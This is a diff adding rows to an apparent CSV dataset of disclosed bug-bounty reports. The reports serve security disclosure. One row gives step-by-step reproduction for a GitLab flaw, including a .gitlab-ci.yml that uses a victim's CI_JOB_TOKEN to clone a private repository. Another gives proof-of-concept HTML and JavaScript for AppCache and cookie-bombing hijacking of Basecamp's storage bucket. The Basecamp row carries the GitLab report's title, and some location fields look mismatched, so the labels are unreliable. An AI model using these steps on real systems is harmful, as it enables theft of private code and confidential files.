@@ -37769,3 +37769,161 @@ Go to http://████████/bc3attach and then try to open any direct 
 Refer to the video.
 Impact
 Direct links to any attachments can be hijacked and confedential files can be compromised1 attachment:F340718: capture-132.avi",No value,California,United States,San Francisco,2020,6,9,15,53,No value
+No value,1001-5000,0.0,10m-50m,No value,High,7.95,Business Logic Errors,An attacker can run pipeline jobs as arbitrary user,"u3mur4  submitted a report to GitLab.Jun 9th (2 years ago)Summary
+An attacker can run arbitrary pipeline jobs as a victim user. This means the attacker can access the user private repositories, member only repositories, registry, etc... by using the victim CI_JOB_TOKEN token.
+
+This is only my recent research and I wanted to report it as soon as possible. I will update the report with more information later on.
+
+Steps to reproduce
+VICTIM:
+
+Sign in to a GitLab instance as a Victim user
+Create an arbitrary private repository with some private files. (We will steal this repo as a poc.)
+
+ATTACKER ACCOUNT 1: 
+
+Sign in to a GitLab instance as a Attacker1 user
+Create a new project using the following settings:
+
+Project Name: poc
+Visibility Level : public
+Check the Initialize repository with a README checkbox
+
+
+Add a new .gitlab-ci.yml file to the project
+
+Code 83 BytesWrap lines Copy Download1image: ""ruby:2.6""
+2
+3before_script:
+4  - echo Hello
+5
+6rspec:
+7  script:
+8    - echo Hello
+
+We will mirror this repository and update the .gitlab-ci.yml file later on to trigger the CI/CD job.
+
+ATTACKER ACCOUNT 2: 
+
+Sign in / Register to a GitLab instance as a Attacker2 user
+Create a new public group called as test
+Create a new project inside the test group using the following settings:
+
+Project Name: poc
+Visibility Level : public
+
+
+Go to Project settings => Repository => Mirroring repositories
+
+Set Git repository URL to the previously created repository by the Attacker1 user
+Set Mirror direction to Pull
+Check the Trigger pipelines for mirror updates checkbox
+Click the Mirror repository button
+
+
+Go to the test group Members option and invite the Victim user
+Set the Victim user Choose a role permission to Owner
+Go to the Account Setting => Account and delete this account.
+
+ATTACKER ACCOUNT 1: 
+
+Sign in back to the GitLab instance as a Attacker1 user
+Go to the attacker1/poc project and update the .gitlab-ci.yml file using the following content:
+
+Code 192 BytesWrap lines Copy Download1image: ""ruby:2.6""
+2
+3rspec:
+4  script:
+5    - git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/victim/private_repo_name.git
+6    - cd private_repo_name
+7    - ls -lah .
+8    - cat README.md
+
+Wait half an hour to automatically trigger a mirror update in the test/poc project which owner is the Victim user.
+
+The test/poc project will trigger a mirror update which also triggers a pipeline run. The triggerer of the pipeline will be the Victim user.
+The Attacker1 user controls the attacker/poc/gitlab-ci.yml file which is mirrored to the test/poc project.
+What is the current bug behavior?
+
+If there is a mirrored project with Trigger pipelines for mirror updates enabled inside a group and the group owner delete its account (need another owner role inside the group) then the trigger of the pipeline will be to other owner account. (I think this only works when the account deleted without removing the account from the group members but I still need to confirm this.)
+
+What is the expected correct behavior?
+
+refuse pipeline run in the previously mentioned case
+
+Output of checks
+This bug happens on GitLab.com.
+Results of GitLab environment info
+Code 976 BytesWrap lines Copy Download1bundle exec rake gitlab:env:info RAILS_ENV=development
+2System information
+3System:		
+4Proxy:		no
+5Current User:	u3mur4
+6Using RVM:	no
+7Ruby Version:	2.6.6p146
+8Gem Version:	3.0.3
+9Bundler Version:1.17.3
+10Rake Version:	12.3.3
+11Redis Version:	6.0.4
+12Git Version:	2.27.0
+13Sidekiq Version:5.2.7
+14Go Version:	go1.14.4 linux/amd64
+15
+16GitLab information
+17Version:	13.1.0-pre
+18Revision:	4bd9f8164e0
+19Directory:	/home/u3mur4/Hack/gitlab/gitlab-development-kit/gitlab
+20DB Adapter:	PostgreSQL
+21DB Version:	12.3
+22URL:		http://gdk.yoyo.pw:3000
+23HTTP Clone URL:	http://gdk.yoyo.pw:3000/some-group/some-project.git
+24SSH Clone URL:	ssh://u3mur4@gdk.yoyo.pw:2222/some-group/some-project.git
+25Elasticsearch:	no
+26Geo:		no
+27Using LDAP:	no
+28Using Omniauth:	yes
+29Omniauth Providers: google_oauth2
+30
+31GitLab Shell
+32Version:	13.3.0
+33Repository storage paths:
+34- default: 	/home/u3mur4/Hack/gitlab/gitlab-development-kit/repositories
+35GitLab Shell path:		/home/u3mur4/Hack/gitlab/gitlab-development-kit/gitlab-shell
+36Git:		/usr/bin/git
+Impact
+stealing the CI_JOB_TOKEN of any user (access the user private repositories, member only repositories and registry, etc...)",No value,England,United Kingdom,London,2020,6,9,15,53,No value
+No value,1001-5000,0.0,No value,No value,Low,2.0,Business Logic Errors,An attacker can run pipeline jobs as arbitrary user,"hudmi  submitted a report to Basecamp.Aug 31st (4 years ago)Basecamp attachments are stored in the bc3_production_blobs bucket in the root directory and can be served with text/html content-type. 
+https://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com&Expires=1535826443&Signature=*sign*&response-content-type=text/html
+So with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker.
+To know more about this trick refer to https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/
+Reproduction steps
+To upload the files:
+
+Login to 3.basecamp.com
+Open campfire of any project
+Upload target files 
+Extract direct links of them to Google Storage and remove response-content-disposition param
+
+I have uploaded 3 files by this way:
+Code 280 BytesWrap lines Copy Download1<html manifest=""[manifest_url]"">
+2This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.
+3<script>
+4setTimeout(function(){
+5for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
+6}, 3000);
+7</script>
+8</html>
+Code 64 BytesWrap lines Copy Download1CACHE MANIFEST 
+2
+3FALLBACK:
+4/bc3_production_blobs/ [fallback_url]
+Code 99 BytesWrap lines Copy Download1<html>
+2<script>
+3alert('Your request to the page '+location.href+' is hijacked!');
+4</script>
+5</html>
+PoC
+Go to http://████████/bc3attach and then try to open any direct link of bc3_production_blobs bucket. You will see alert popup with full url of this file.
+Refer to the video.
+Impact
+Direct links to any attachments can be hijacked and confedential files can be compromised1 attachment:F340718: capture-132.avi",No value,England,United Kingdom,London,2020,6,9,15,53,No value
